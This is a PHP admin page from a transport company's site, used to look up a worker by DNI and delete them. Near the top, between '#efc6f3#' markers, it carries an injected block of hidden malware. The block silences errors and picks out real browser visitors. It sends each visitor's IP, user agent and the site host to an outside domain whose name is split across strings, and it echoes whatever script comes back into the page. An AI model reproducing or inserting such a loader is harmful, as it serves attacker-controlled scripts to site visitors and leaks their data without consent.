<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}		
	include("../conexion/ajax.php");	
?>
<?php
#efc6f3#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/efc6f3#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function eliminar()
	{
		agregarCargando('cargando');
		dni = document.getElementById("textDNI").value;
		if(dni.length==0)
		{
			alert("¡ Debes buscar primero un trabajador !");
			quitarCargando('cargando');
			return;
		}
		document.getElementById("form1").submit();
	}
	
	function buscar()
	{
		agregarCargando('cargando');
		dni = document.getElementById("textDNI").value;
		if(dni.length!=8)
		{
			alert("¡ Debes ingresar un número de DNI !");
			quitarCargando('cargando');
			return;
		}
		_obj = crearObjeto();			
		_url = "ajaxManejador.php";
		_valores = "op=buscarTrabajador&clave="+dni;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			if(_obj.readyState==4)
			{
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					resp = resp.split("*");		
					if(resp[0]=="")
					{
						alert("¡ No existre trabajador registrado con tal DNI !");
						document.getElementById("textDNI").value = "";	
						document.getElementById("nombre").innerHTML = "";
						document.getElementById("direccion").innerHTML = "";
						document.getElementById("telefono").innerHTML = "";												
					}
					else
					{
						document.getElementById("nombre").innerHTML = resp[0] + " " + resp[1] + " " + resp[2];
						document.getElementById("direccion").innerHTML = resp[4];
						document.getElementById("telefono").innerHTML = resp[7];	
					}
					quitarCargando('cargando');
				}
			}
		}
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>:: Transportes Marin Hermanos - EliminarTrabajador ::</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="form1" name="form1" method="post" action="admin.php">
          <table width="369" border="0" align="center">
            <tr>
              <th height="58" colspan="3" scope="col">ELIMINAR UN TRABAJADOR </th>
              </tr>
            <tr>
              <td width="115" height="34"><em><strong>DNI : </strong></em></td>
              <td width="168"><label>
                <input name="textDNI" type="text" id="textDNI" maxlength="8" />
              </label></td>
              <td width="64">&nbsp;</td>
            </tr>
            <tr>
              <td height="37">&nbsp;</td>
              <td><label>
                <input name="Buscar" type="button" id="Buscar" value="Buscar" onClick="buscar()" />
              </label></td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="32"><em><strong>Nombre : </strong></em></td>
              <td><div align="justify" id="nombre"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>Direccion : </strong></em></td>
              <td><div align="justify" id="direccion"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="28"><em><strong>Telefono : </strong></em></td>
              <td><div align="justify" id="telefono"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td colspan="3">&nbsp;</td>
              </tr>
            <tr>
              <td><label>
                <div align="center">
                  <input name="Eliminar" type="button" id="Eliminar" value="Eliminar" onClick="eliminar()"/>
                  </div>
              </label></td>
              <td colspan="2"><label>
                <div align="center">
                  <input name="Cancelar" type="button" id="Cancelar" value="Cancelar" onClick="go()" />
                  <label>
                  <input name="op" type="hidden" id="op" value="eliminarTrab" />
                  </label>
                </div>
              </label></td>
              </tr>
          </table>
                <p>&nbsp;</p>
        </form>
        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

